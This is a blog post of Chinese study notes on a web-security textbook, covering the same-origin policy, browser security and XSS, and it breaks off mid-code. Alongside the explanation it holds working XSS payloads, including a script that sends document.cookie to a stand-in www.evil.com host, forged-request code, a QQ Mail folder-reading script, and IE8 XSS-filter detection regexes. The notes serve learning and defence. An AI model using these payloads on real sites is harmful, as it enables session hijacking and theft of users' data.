@@ -1,0 +1,993 @@
+---
+layout:     post
+title:      "[DRAFT杂乱笔记] 《白帽子讲 web 安全》 Notes"
+date:       2017-06-20 17:10:00
+author:     "LiqueurTofu"
+header-img: "img/home-bg-art.jpg"
+catalog:    true
+tags:
+    - DRAFT杂乱笔记
+---
+
+<br>
+
+# 第一篇 世界观安全
+# 1 我的安全世界观
++ 早期互联网中，Web并非主流应用
+    * 主要攻击目标: 网络、操作系统以及软件等
+    * 基于Web的攻击，一般只能获得较低权限账户，吸引力低
++ web 成为主流
+    * 运营商、防火墙对于网络的封锁，暴露在互联网上的非Web服务越来越少
+    * Web技术的成熟使得Web应用的功能越来越强大
++ 另外一个重要的分支，即桌面软件安全，或者叫客户端软件安全。
+    * 其代表是浏览器攻击。一个典型的攻击场景是，黑客构造一个恶意网页，诱使用户使用浏览器访问该网页，利用浏览器中存在的某些漏洞，比如一个缓冲区溢出漏洞，执行shellcode，通常是下载一个木马并在用户机器里执行。
+        - 和本书要讨论的Web安全还是有着本质的区别
+            + 即使浏览器安全是Web安全的重要组成部分，在本书中，也讨论浏览器和Web安全有关的部分。
++ 安全问题的本质是信任的问题
+    * 将不同重要程度的区域划分出来
+    * 通过一个安全检查（过滤、净化）的过程，可以梳理未知的人或物，使其变得可信任。被划分出来的具有不同信任级别的区域，我们称为信任域，划分两个不同信任域之间的边界，我们称为信任边界。
+    * 数据从高等级的信任域流向低等级的信任域，是不需要经过安全检查的；数据从低等级的信任域流向高等级的信任域，则需要经过信任边界的安全检查。
++ 安全三要素
+    * CIA
+        - 机密性（Confidentiality）、完整性（Integrity）、可用性（Availability）。
+            + 扩充这些要素，增加了诸如可审计性、不可抵赖性等
++ 如何实施安全评估
+    * 资产等级划分、威胁分析、风险分析、确认解决方案
+        - 可能造成危害的来源称为威胁（Threat），而把可能会出现的损失称为风险（Risk）。风险一定是和损失联系在一起的，很多专业的安全工程师也经常把这两个概念弄混
+        - 威胁分析
+            + 头脑风暴法
+            + 使用一个模型
+                * [微软 STRIDE模型](https://msdn.microsoft.com/en-us/library/ee823878(v=cs.20).aspx)
+                    - Spoofing identity
+                    - Tampering with data
+                    - Repudiation
+                    - Information disclosure
+                    - Denial of service
+                    - Elevation of privilege
+        - 风险分析
+            + ` Risk = Probability * Damage Potential `
+            + DREAD模型
+                * Damage potential: How great is the damage if the vulnerability is exploited?
+                * Reproducibility: How easy is it to reproduce the attack?
+                * Exploitability: How easy is it to launch an attack?
+                * Affected users: As a rough percentage, how many users are affected?
+                * Discoverability: How easy is it to find the vulnerability?
+                * 在DREAD模型里，每一个因素都可以分为高、中、低三个等级。在上表中，高、中、低三个等级分别以3、2、1的分数代表其权重值，因此，我们可以具体计算出某一个威胁的风险值。
++ 白名单
+    + 并不是用了白名单就一定安全了
+        * 基于信任白名单
+- 最小权限原则
++ 纵深防御
+    * 多种方案配合
+    * 正确地方做正确事情
+        - 在解决根本问题的地方实施针对性的安全方案
+        - XSS 过滤
+            + 过滤用户输入?
+                * 不适合
+                    - 因为XSS真正产生危害的场景是在用户的浏览器上，或者说服务器端输出的HTML页面，被注入了恶意代码。只有在拼装HTML时输出，系统才能获得HTML上下文的语义，才能判断出是否存在误杀等情况。
++ 数据和代码分离
+    * 例子
+        - 缓冲区溢出
+        - XSS
+        - SQLi
+        - CRLF
+        - X-Path Injection
+    * 把数据当作代码来执行就会出问题
+        - 如对于
+            ```
+            <body>
+            $var
+            </body>
+            ```
+          若 `$var` 为 `<script src=XXX></script>` 就危险了
++ 不可预测原则
+    * windows against 缓冲区溢出
+        - DEP, Data Execution Prevention
+            + Executable space protection
+            + 堆栈不可执行
+        - ASLR, Address space layout randomization
+            + 进程栈基址随机变化
+    * 对抗 篡改/伪造
+        - 防批量删除
+        - 防CSRF
+            + token 需要不可预测
++ 谁为安全买单
+    * 假设用户是小白
+    * 我们定义一个功能是否是漏洞，只看后果，而不应该看过程。
+    * 在PHP的5.3.4版本中，修补了很多年来万恶的 [0字节截断功能e](http://blog.ikinvin.com/index/article/aid/19) ，这个功能被文件包含漏洞利用，酿造了无数“血案”.
+        - 这是操作系统的问题，谁叫操作系统在遍历文件路径时会被0字节截断，谁叫C语言的string操作是以0字节为结束符
+        - [理解%00截断原理](http://whc.dropsec.xyz/2017/07/03/%E7%90%86%E8%A7%A300%E6%88%AA%E6%96%AD%E5%8E%9F%E7%90%86/)
+        - [php上传中%00截断的理解](http://www.mottoin.com/18439.html)
+
+# 第二篇 客户端脚本安全
+# 2 浏览器安全
++ 互联网的重要入口
+    * 浏览器的安全以同源策略为基础，加深理解同源策略，才能把握住浏览器安全的本质。
+    * 紧跟浏览器发展的脚步来研究浏览器安全
++ 同源策略, Same Origin Policy
+    * 看
+        - 域名/IP
+        - 子域名
+        - 端口
+        - 协议
+    * 在哪不重要，重要的是谁加载
+        * `a.com` 加载 `b.com/b.js`, 源还是 `a.com`
+    + `<script>`, `<img>`, `<iframe>`, `<link>` 等标签都可以跨域加载资源, 而不受同源策略的限制
+        * 这些带“src”属性的标签每次加载时，实际上是由浏览器发起了一次GET请求
+        * 不同于XMLHttpRequest的是，通过src属性加载的资源，浏览器限制了JavaScript的权限，使其不能读、写返回的内容。
+    + 受同源策略的限制
+        * DOM
+        * Cookie
+        - XMLHttpRequest
+            + 能访问来自同源对象的内容
+                ```
+                <html>
+                  <head>
+                    <script type="text/javascript">
+                      var xmlhttp;
+                      function loadXMLDoc(url)
+                      {
+                        xmlhttp=null;
+                        if (window.XMLHttpRequest)
+                        {// code for Firefox, Opera, IE7, etc.
+                          xmlhttp=new XMLHttpRequest();
+                        }
+                        else if (window.ActiveXObject)
+                        {// code for IE6, IE5
+                          xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+                        }
+                        if (xmlhttp!=null)
+                        {
+                          xmlhttp.onreadystatechange=state_Change;
+                          xmlhttp.open("GET",url,true);
+                          xmlhttp.send(null);
+                        }
+                        else
+                        {
+                          alert("Your browser does not support XMLHTTP.");
+                        }
+                      }
+
+                      function state_Change()
+                      {
+                        if (xmlhttp.readyState==4)
+                        {// 4 = "loaded"
+                          if (xmlhttp.status==200)
+                          {// 200 = "OK"
+                            document.getElementById('T1').innerHTML=xmlhttp.responseText;
+                          }
+                          else
+                          {
+                            alert("Problem retrieving data:" + xmlhttp.statusText);
+                          }
+                        }
+                          else
+                          {
+                            alert("Problem retrieving data:" + xmlhttp.statusText);
+                          }
+                        }
+                      }
+                    </script>
+                  </head>
+
+                  <body onload="loadXMLDoc('/example/xdom/test_xmlhttp.txt')">
+                    <div id="T1" style="border:1px solid black;height:40;width:300;padding:5"></div><br />
+                    <button onclick="loadXMLDoc('/example/xdom/test_xmlhttp2.txt')">Click</button>
+                  </body>
+
+                </html>
+                ```
+                * `xmlhttp.readyState==4 //loaded`
+                * `xmlhttp.status==200 //OK`
+            + 受到同源策略的约束, XMLHttpRequest 不能跨域访问资源
+                + AJAX 中应注意
+                + XMLHttpRequest 跨域访问标准
+                    * XMLHttpRequest 现在也可 __跨域__
+                    * 随着业务的发展，跨域请求的需求越来越迫切
+                    * W3C 委员会制定了 XMLHttpRequest 跨域访问标准
+                    * 目标域返回 HTTP 头授权是否允许跨域
+                        - 信任基础
+                            + js 无法控制 HTTP 头
+        * some Plugins
+            - Flash
+                + 通过 b.com 提供的 `crossdomain.xml` 文件判断是否允许当前 a.com 加载的 Flash 跨域访问 b.com 资源
+                    ```
+                    <cross-domain-policy>
+                      <allow-access-from domain="*.taobao.com"/>
+                      <allow-access-from domain="*.taobao.net"/>
+                      <allow-access-from domain="*.taobaocdn.com"/>
+                      <allow-access-from domain="*.tbcdn.cn"/>
+                      <allow-access-from domain="*.allyes.com"/>
+                    </cross-domain-policy>
+                    ```
+                + Flash 9
+                    * MIME检查以确认 is `crossdomain.xml` legal
+                        * MIME, Multipurpose Internet Mail Extensions
+                        * 比如查看服务器返回HTTP头的Content-Type是否是 `text/*`、`application/xml`、`application/xhtml+xml`
+                        * 这样做的原因，是因为攻击者可以通过上传crossdomain.xml文件控制Flash的行为，绕过同源策略。
+                    + checking `crossdomain.xml` under root dir
+            - Java Applet
+            - Silverlight
+            - Google Gears
++ 绕过浏览器的同源策略
+    * IE8 CSS 跨域
+        - www.a.com/test.html
+            ```
+            <body>
+              {}body{font-family:
+
+              aaaaaaaaaaaaaa
+
+              bbbbbbbbbbbbbbbb
+
+            </body>
+            ```
+        - www.b.com/test2.html
+            ```
+            <style>
+              @import url("http://www.a.com/test.html");
+            </style>
+
+            <script>
+              setTimeout(function(){
+                var t = document.body.currentStyle.fontFamily;
+                alert(t);
+              },2000);
+            </script>
+            ```
+        - 在www.b.com/test2.html中通过@import 加载了 http://www.a.com/test.html 为CSS文件，渲染进入当前页面DOM，同时通过 document.body.currentStyle.fontFamily 访问此内容。问题发生在IE的CSS Parse的过程中，IE将fontFamily后面的内容当做了value，从而可以读www.a.com/test.html 的页面内容
++ 浏览器沙箱
+    * 浏览器多进程架构
+        - Google Chrome
+            + 浏览器进程
+            + 渲染进程
+                * Sandbox
+            + 插件进程
+                * flash、java、pdf等
+                * 第三方插件却往往不受Sandbox管辖
+            + 扩展进程
+        - IE 8
+            + 每一个Tab页即是一个进程
++ 恶意网址拦截
+    * 恶意网址
+        - 挂马网站
+        - 钓鱼网站
+    * defense
+        - 黑名单
+            + PhishTank是互联网上免费提供恶意网址黑名单的组织之一，它的黑名单由世界各地的志愿者提供，且更新频繁。
+            + Google也公开了其内部使用的SafeBrowsing API，任何组织或个人都可以在产品中接入，以获取Google的恶意网址库。
+        - EV SSL证书（Extended Validation SSL Certificate）
+            + 绿色的醒目提示
++ other 新的安全功能
+    * IE 8 XSS Filter
+        - 反射型XSS
+        - 当用户访问的URL中包含了XSS攻击的脚本时，IE就会修改其中的关键字符使得攻击无法成功完成，并对用户弹出提示框。
+        - .
+            ```
+            {(v|(&[#()\[\].]x?0*((86)|(56)|(118)|(76));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(b|(&[#()\[\].]x?0*((66)|(42)|(98)|(62));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(s|(&[#()\[\].]x?0*((83)|(53)|(115)|(73));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(c|(&[#()\[\].]x?0*((67)|(43)|(99)|(63));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*{(r|(&[#()\[\].]x?0*((82)|(52)|(114)|(72));?))}([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(i|(&[#()\[\].]x?0*((73)|(49)|(105)|(69));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(p|(&[#()\[\].]x?0*((80)|(50)|(112)|(70));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(t|(&[#()\[\].]x?0*((84)|(54)|(116)|(74));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(:|(&[#()\[\].]x?0*((58)|(3A));?)).}
+
+            {(j|(&[#()\[\].]x?0*((74)|(4A)|(106)|(6A));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(a|(&[#()\[\].]x?0*((65)|(41)|(97)|(61));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(v|(&[#()\[\].]x?0*((86)|(56)|(118)|(76));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(a|(&[#()\[\].]x?0*((65)|(41)|(97)|(61));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(s|(&[#()\[\].]x?0*((83)|(53)|(115)|(73));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(c|(&[#()\[\].]x?0*((67)|(43)|(99)|(63));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*{(r|(&[#()\[\].]x?0*((82)|(52)|(114)|(72));?))}([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(i|(&[#()\[\].]x?0*((73)|(49)|(105)|(69));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(p|(&[#()\[\].]x?0*((80)|(50)|(112)|(70));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(t|(&[#()\[\].]x?0*((84)|(54)|(116)|(74));?))([\t]|(&[#()\[\].]x?0*(9|(13)|(10)|A|D);?))*(:|(&[#()\[\].]x?0*((58)|(3A));?)).}
+
+            {<st{y}le.*?>.*?((@[i\\])|(([:=]|(&[#()\[\].]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&[#()\[\].]x?0*((40)|(28)|(92)|(5C));?))))}
+
+            {[ /+\t\"\'&#x60;]st{y}le[ /+\t]*?=.*?([:=]|(&[#()\[\].]x?0*((58)|(3A)|(61)|(3D));?)).*?([(\\]|(&[#()\[\].]x?0*((40)|(28)|(92)|(5C));?))}
+
+            {<OB{J}ECT[ /+\t].*?((type)|(codetype)|(classid)|(code)|(data))[ /+\t]*=}
+
+            {<AP{P}LET[ /+\t].*?code[ /+\t]*=}
+
+            {[ /+\t\"\'&#x60;]data{s}rc[ +\t]*?=.}
+
+            {<BA{S}E[ /+\t].*?href[ /+\t]*=}
+
+            {<LI{N}K[ /+\t].*?href[ /+\t]*=}
+
+            {<ME{T}A[ /+\t].*?http-equiv[ /+\t]*=}
+
+            {<\?im{p}ort[ /+\t].*?implementation[ /+\t]*=}
+
+            {<EM{B}ED[ /+\t].*?SRC.*?=}
+
+            {[ /+\t\"\'&#x60;]{o}n\c\c\c+?[ +\t]*?=.}
+
+            {<.*[:]vmlf{r}ame.*?[ /+\t]*?src[ /+\t]*=}
+
+            {<[i]?f{r}ame.*?[ /+\t]*?src[ /+\t]*=}
+
+
+            {<is{i}ndex[ /+\t>]}
+
+            {<fo{r}m.*?>}
+
+            {<sc{r}ipt.*?[ /+\t]*?src[ /+\t]*=}
+
+            {<sc{r}ipt.*?>}
+
+            {[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).*?(((l|(\\u006C))(o|(\\u006F))({c}|(\\u00{6}3))(a|(\\u0061))(t|(\\u0074))(i|(\\u0069))(o|(\\u006F))(n|(\\u006E)))|((n|(\\u006E))(a|(\\u0061))({m}|(\\u00{6}D))(e|(\\u0065)))).*?=}
+
+            {[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{[\[]}.*?{[\]]}.*?=}
+
+            {[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{[.]}.+?=}
+
+            {[\"\'].*?{\)}[ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{\(}}
+
+            {[\"\'][ ]*(([^a-z0-9~_:\'\" ])|(in)).+?{\().*?{\}}}
+            ```
+    - Firefox 4
+        + Content Security Policy（__CSP__）
+            * 安全专家Robert Hanson最早提出
+            * 由服务器端返回一个HTTP头，并在其中描述页面应该遵守的安全策略
+            * 由于XSS攻击在没有第三方插件帮助的情况下，无法控制HTTP头，所以这项措施是可行的。
+            * 这种自定义的语法必须由浏览器支持并实现
+            * 使用CSP的方法
+                - 插入一个HTTP返回头 `X-Content-Security-Policy: policy`
+                - 其中 policy 的描述极其灵活
+                    ```
+                    X-Content-Security-Policy: allow 'self' *.mydomain.com
+                    ```
+                        * 浏览器将信任来自 mydomain.com及其子域下的内容。
+                    ```
+                    X-Content-Security-Policy: allow 'self'; img-src *; media-src media1.com; script-src userscripts.example.com
+                    ```
+                        * 除了信任自身的来源外，还可以加载任意域的图片、来自media1.com的媒体文件，以及userscripts.example.com的脚本，其他的则一律拒绝。
+            * CSP未能得到很好的推广
+                - 设计理念出色
+                - 规则配置较为复杂，在页面较多的情况下，很难一个个配置起来
+                - 后期维护成本也非常大
+* 浏览器的用户体验越来越好，随之而来的是许多标准定义之外的“友好”功能，但可能被黑客利用绕过一些安全软件或者安全模块，导致一些安全隐患。
+    - 浏览器地址栏对于 __畸形URL__ 的处理各自不同
+        + `www.google.com\abc`
+            * IE & Chrome
+                -  正常解析 `www.google.com/abc`
+            * Firefox
+                - 将被认为非法
+        + `www.google.com?abc`
+            * Firefox、IE、Chrome
+                - 解析成 `www.google.com/?abc`
+        + Firefox 还能认识
+            * .
+                ```
+                [http://www.cnn.com]
+                [http://]www.cnn.com
+                [http://www].cnn.com
+                ……
+                ```
+* 扩展和插件
+    - 插件可能存在漏洞外
+    - 插件本身也可能会有恶意行为
+        + `Trojan.PWS.ChromeInject.A`
+            * 窃取网银密码
+                - 监控所有Firefox浏览的网站，如果发现用户在访问网银，就准备开始记录密码，并发送到远程服务器。
+            * 有两个文件
+                - `"%ProgramFiles%\Mozilla Firefox\plugins\npbasic.dll"`
+                - `"%ProgramFiles%\Mozilla Firefox\chrome\chrome\content\browser.js"`
+    - 扩展和插件的权限都 __高于页面JavaScript__ 的权限，比如可以进行一些跨域网络请求
+
+# 3 跨站脚本攻击 XSS
++ 客户端脚本安全中的头号大敌
+    * XSS破坏力强大，且产生的场景复杂，难以一次性解决
+        - 业内共识
+            + 区分情景对待
+    * OWASP TOP 10 多次榜首
+    * 虽然复杂，但 __可以彻底解决__
+        - 设计XSS解决方案时，应该深入理解XSS攻击的 __原理__ ，针对 __不同的场景__ 使用不同的方法
+        - 很多开源项目提供了参考
++ 简介
+    * Cross Site Script
+        - 为了和层叠样式表（Cascading Style Sheet，CSS）有所区别
+        - 通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器
+            + 一开始，这种攻击的演示案例是跨域的
+            + 发展到今天，是否跨域已经不再重要。
+                * 由于JavaScript的强大功能以及网站前端应用的复杂化
+        - 分类
+            + 反射型
+                * 简单地把用户输入的数据“反射”给浏览器
+                    - 往往需要诱使用户“点击”一个恶意链接
+                * 也叫做“非持久型XSS”（Non-persistent XSS）
+                * 例子
+                    ```
+                    <?php
+
+                    $input = $_GET["param"];
+                    echo "<div>".$input."</div>";
+
+                    ?>
+                    ```
+                        + 提交
+                            ```
+                            http://www.a.com/test.php?param=<script>alert(/xss/)</script>
+                            ```
+            + 存储型
+                * 存储型XSS会把用户输入的数据“存储”在服务器端
+                * 具有很强的稳定性
+                * 比较常见的一个场景
+                    - 发表包含有恶意JavaScript代码的博客文章
+                    - 保存到 __服务器端__ 
+                    - 所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。
+                * 通常也叫做“持久型XSS”(Persistent XSS)
+                    - 从效果上来说，它存在的时间是比较长的。
+            + DOM based 型
+                * 通过 __修改页面的DOM节点__ 形成的XSS
+                * 并非按照“数据是否保存在服务器端”来划分
+                    - 效果上来说也是反射型XSS
+                    - 单独划分出来，是因为DOM Based XSS的形成原因比较特别，发现它的安全专家专门提出了这种类型的XSS。出于历史原因，也就把它单独作为一个分类了。
+                * 例子
+                    - .
+                        ```
+                        <script>
+
+                          function test(){
+                            var str = document.getElementById("text").value;
+                            document.getElementById("t").innerHTML = "<a href='"+str+"' >testLink</a>";
+                          }
+
+                        </script>
+
+                        <div id="t" ></div>
+                        <input type="text" id="text" value="" />
+                        <input type="button" id="s" value="write" onclick="test()" />
+                        ```
+                        + 构造
+                            ```
+                            ' onclick=alert(/xss/) //
+                            ```
+                            + 首先用一个单引号闭合掉href的第一个单引号，然后插入一个onclick事件，最后再用注释符“//” __注释掉第二个单引号__ 。
+                        + __另一种利用方式__
+                            * 闭合掉 `<a>` 标签，并插入一个新的HTML标签
+                                ```
+                                '><img src=# onerror=alert(/xss2/) /><'
+                                ```
++ 进阶
+    * XSS Payload
+        - JavaScript脚本（还可以是Flash或其他富客户端的脚本）
+        - 最常见的读取浏览器的Cookie对象，从而发起“Cookie劫持”
+            + 一般加密保存了当前用户的登录凭证，浏览器发起的所有请求自动带上Cookie。
+            + Cookie如果丢失，往往意味着用户的登录凭证丢失。
+                * 如果Cookie没有绑定客户端信息，当攻击者窃取了Cookie后，就可以不用密码登录进用户的账户
+            + 先加载一个远程脚本
+                ```
+                http://www.a.com/test.htm?abc="><script src=http://www.evil.com/evil.js ></script>
+                ```
+                * evil.js
+                    ```
+                    var img = document.createElement("img");
+                    img.src = "http://www.evil.com/log?"+escape(document.cookie);
+                    document.body.appendChild(img);
+                    ```
+                * 真正的XSS Payload写在这个远程脚本中，避免直接在URL的参数里写入大量的JavaScript代码。
+                * 事实上，http://www.evil.com/log 并 __不一定要存在__ ，因为这个请求会在远程服务器的Web日志中留下记录
+                    ```
+                    127.0.0.1 - - [19/Jul/2010:11:30:42 +0800] "GET /log?cookie1%3D1234 HTTP/1.1" 404 288
+                    ```
+            + __防止__ “Cookie劫持”
+                * 在Set-Cookie时给关键Cookie植入HttpOnly标识
+                * 把Cookie与客户端IP绑定
+        - 强大的XSS Payload
+            + 构造GET与POST请求
+                * GET
+                    ```
+                    var img = document.createElement("img");
+                    img.src = "http://blog.sohu.com/manage/entry.do?m=delete&id=156713012";
+                    document.body.appendChild(img);
+                    ```
+                * POST
+                    - `ck=JiUY&mb_text=testtesttest`
+                        + form表单自动提交
+                            * 构造DOM节点
+                                ```
+                                var f = document.createElement("form");
+                                f.action = "";
+                                f.method = "post";
+                                document.body.appendChild(f);
+
+                                var i1 = document.createElement("input");
+                                i1.name = " ck";
+                                i1.value = " JiUY";
+                                f.appendChild(i1);
+
+                                var i2 = document.createElement("input");
+                                i2.name = " mb_text";
+                                i2.value = "testtesttest";
+                                f.appendChild(i2);
+
+                                f.submit();
+                                ```
+                            * 直接写HTML代码
+                                ```
+                                var dd = document.createElement("div");
+                                document.body.appendChild(dd);
+                                dd.innerHTML = '<form action="" method="post" id="xssform" name="mbform">'+
+                                  '<input type="hidden" value="JiUY" name="ck" />'+
+                                  '<input type="text" value="testtesttest" name="mb_text" />'+
+                                  '</form>'
+
+                                document.getElementById("xssform").submit();
+                                ```
+                        + XMLHttpRequest发送一个POST请求
+                            ```
+                            var url = "https://www.douban.com";    
+                            var postStr = "ck=JiUY&mb_text=test1234";
+
+                            var ajax = null;
+                            if(window.XMLHttpRequest){
+                              ajax = new XMLHttpRequest();
+                            }
+                            else if(window.ActiveXObject){
+                              ajax = new ActiveXObject("Microsoft.XMLHTTP");
+                            }
+                            else{
+                              return;
+                            }
+
+                            ajax.open("POST", url, true);
+                            ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
+                            ajax.send(postStr);
+                            ajax.onreadystatechange = function(){
+                              if (ajax.readyState == 4 && ajax.status == 200){
+                                alert("Done!");
+                              }
+                            }
+                            ```
+                * 读取QMail用户的邮件文件夹
+                    - 抓包
+                        ```
+                        http://m57.mail.qq.com/cgi-bin/mail_list?sid=6alhx3p5yzh9a2om7U51dDyz&folderid=1&page=0&s=inbox&loc=folderlist,,,1
+                        ```
+                    - 真正能访问到邮件列表的链接
+                        ```
+                        http://m57.mail.qq.com/cgi-bin/mail_list?folderid=1&page=0&s=inbox&sid=6alhx3p5yzh9a2om7U51dDyz
+                        ```
+                    - `sid` 字面推测是用户ID加密后的值
+                    - 思路
+                        + 先获取到sid的值，然后构造完整的URL，并使用XMLHttpRequest请求此URL，应该就能得到邮件列表了
+                            ```
+                            if (top.window.location.href.indexOf("sid=")>0){      
+                                  var sid = top.window.location.href.substr(top.window.location.href.indexOf("sid=") +4,24);
+                                }
+
+
+                                var folder_url = "http://"+top.window.location.host+"/cgi-bin/mail_list?folderid= 1&page=0&s=inbox&sid="+sid;  
+
+                                var ajax = null;
+                                if(window.XMLHttpRequest){
+                                  ajax = new XMLHttpRequest();
+                                }
+                                else if(window.ActiveXObject){
+                                  ajax = new ActiveXObject("Microsoft.XMLHTTP");
+                                }
+                                else{
+                                  return;
+                                }
+
+                                ajax.open("GET", folder_url, true);
+                                ajax.send(null);
+
+                                ajax.onreadystatechange = function(){
+                                  if (ajax.readyState == 4 && ajax.status == 200){
+                                    alert(ajax.responseText);
+                                    //document.write(ajax.responseText)
+                                  }
+                                }      
+                            ```
+            + XSS钓鱼
+                * 验证码
+                    - 读取页面内容，将验证码的图片URL发送到远程服务器
+                        + 攻击者可以在远程XSS后台接收当前验证码，并将验证码的值返回给当前的XSS Payload，从而绕过验证码
+                * “Old Password” in “修改用户密码”
+                    - 利用JavaScript在当前页面上“画出”一个伪造的登录框，当用户在登录框中输入用户名与密码后，其密码将被发送至黑客的服务器上。
+            + 识别用户浏览器
+                * 可用于精准浏览器内存攻击植入木马
+                * 方法
+                    - 读取浏览器的UserAgent对象
+                        ```
+                        alert(navigator.userAgent);
+                        ```
+                        + 得到
+                            ```
+                            OS版本：Windows NT 5.1（这是Windows XP的内核版本）
+                            浏览器版本：Firefox 3.6.7
+                            系统语言：zh-CN（简体中文）
+                            ```
+                        + 可以伪造 信息并不一定准确
+                            * 分辨浏览器之间的细微差别差异，就能准确地判断出浏览器版本，而 __几乎不会误报__
+                                ```
+                                if (window.ActiveXObject){ // MSIE 6.0 or below
+
+                                  //判断是否是IE 7以上
+                                  if (document.documentElement && typeof document.documentElement.style.maxHeight!= "undefined" ){
+
+                                    //判断是否是 IE 8+
+                                    if ( typeof document.adoptNode != "undefined") { // Safari3 & FF & Opera & Chrome & IE8
+                                      //MSIE 8.0  因为同时满足前两个if判断，所以//在这里是IE 8
+                                    }
+                                    // MSIE 7.0  否则就是IE 7
+                                  }       
+                                  return "msie";
+                                }
+                                else if (typeof window.opera != "undefined") { //Opera独占
+                                  // "Opera "+window.opera.version() 
+                                  return "opera";
+                                }
+                                else if (typeof window.netscape != "undefined") { //Mozilla 独占
+                                  // "Mozilla"    
+                                  // 可以准确识别大版本
+                                  if (typeof window.Iterator != "undefined") {
+                                    // Firefox 2 以上支持这个对象
+
+                                    if (typeof document.styleSheetSets != "undefined") { // Firefox 3 & Opera 9
+                                      // Firefox 3  同时满足这些条件的必然是 Firefox 3了
+                                    }
+                                  }
+                                  return "mozilla";
+                                } 
+                                else if (typeof window.pageXOffset != "undefined") { // Mozilla & Safari
+                                  //"Safari"
+                                  try{
+                                    if (typeof external.AddSearchProvider != "undefined") { // Firefox & Google Chrome
+                                      //Google Chrome
+                                      return "chrome";
+                                    } 
+                                  } catch (e) {
+                                    return "safari"; 
+                                  }
+                                } 
+                                else { //unknown
+                                  //Unknown
+                                  return "unknown"; 
+                                }
+                                ```
+                            * Gareth Heyes [更巧妙的方法](http://www.thespanner.co.uk/2009/01/29/detecting-browsers-javascript-hacks/)
+                                ```
+                                //Firefox detector 2/3 by DoctorDan
+                                FF=/a/[-1]=='a'
+                                //Firefox 3 by me:-
+                                FF3=(function x(){})[-5]=='x'
+                                //Firefox 2 by me:-
+                                FF2=(function x(){})[-6]=='x'
+                                //IE detector I posted previously
+                                IE='\v'=='v'
+                                //Safari detector by me
+                                Saf=/a/.__proto__=='//'
+                                //Chrome by me
+                                Chr=/source/.test((/a/.toString+''))
+                                //Opera by me
+                                Op=/^function \(/.test([].sort)
+                                //IE6 detector using conditionals
+                                try {IE6=@cc_on @_jscript_version <= 5.7&&@_jscript_build<10000
+                                ```
+                                - 精简为一行代码
+                                    ```
+                                    B=(function x(){})[-5]=='x'?'FF3':(function x(){})[-6]=='x'?'FF2':/a/[-1]=='a'?'FF':'\v'=='v'?'IE':/a/.__proto__=='//'?'Saf':/s/.test(/a/.toString)?'Chr':/^function \(/.test([].sort)?'Op':'Unknown'
+                                    ```
+            + 识别用户安装的软件
+                * 目的：判断用户安装的软件，选择对应的浏览器漏洞，最终达到植入木马的目的。
+                * IE
+                    - 判断ActiveX控件的classid是否存在，来推测用户是否安装了该软件。
+                        + 通过收集常见软件的classid，就可以扫描出用户电脑中安装的软件列表，甚至包括软件的版本。
+                            * 迅雷的一个控件（“XunLeiBHO.ThunderIEHelper”）
+                                ```
+                                try {
+                                var Obj = new ActiveXObject(‘XunLeiBHO.ThunderIEHelper’);
+                                } catch (e){
+                                  // 异常了，不存在该控件
+                                }
+                                ```
+                                - 如果用户安装了迅雷软件，则默认也会安装此控件。因此通过判断此控件，即可推测用户安装了迅雷软件的可能性。
+                * 一些第三方软件也可能会泄露一些信息。
+                    - Flash
+                        + `system.capabilities` 
+                            * 能够查询客户端电脑中的硬件信息
+                            * 在XSS Payload中使用时，可以在Flash的ActionScript中读取system.capabilities对象后，将结果通过 ExternalInterface 传给页面的JavaScript。
+                * 浏览器的扩展和插件也能被XSS Payload扫描出来。
+                    - 比如Firefox
+                        + 插件
+                            * 插件（Plugins）列表存放在一个DOM对象 `navigator.plugins` 中，通过查询DOM可以遍历出所有的插件
+                        + 扩展
+                            * 通过检测扩展的图标，来判断某个特定的扩展是否存在。
+                                - 在Firefox中有一个特殊的协议：__chrome://__，Firefox的扩展图标可以通过这个协议被访问到
+                                    + Flash Got扩展的图标
+                                        ```
+                                        chrome://flashgot/skin/icon32.png
+                                        ```
+                                        * 扫描Firefox扩展时，只需在JavaScript中加载这张图片，如果加载成功，则扩展存在；反之，扩展不存在。
+                                            ```
+                                            var m = new Image();
+                                            m.onload = function() {
+                                              alert(1);
+                                              //图片存在
+                                            };
+                                            m.onerror = function() {
+                                              alert(2);
+                                              //图片不存在
+                                            };
+                                            m.src = "chrome://flashgot/skin/icon32.png";  //连接图片
+                                            ```
+            + CSS History Hack
+                * 原理
+                    - style 的 visited属性
+                        + 如果用户曾经访问过某个链接，那么这个链接的颜色会变得与众不同
+                            ```
+                            <body>
+                              <a href=# >曾经访问过的</a>
+                              <a href="notexist" >未曾访问过的</a>
+                            </body>
+                            ```
+            + 获取用户的真实IP地址
+                ```
+                <script> 
+                  <!--
+                    /*
+                NAME: JavaScript History Thief
+                AUTHOR: Jeremiah Grossman
+
+                BSD LICENSE:
+                Copyright (c) 2006, WhiteHat Security, Inc.
+                All rights reserved.
+
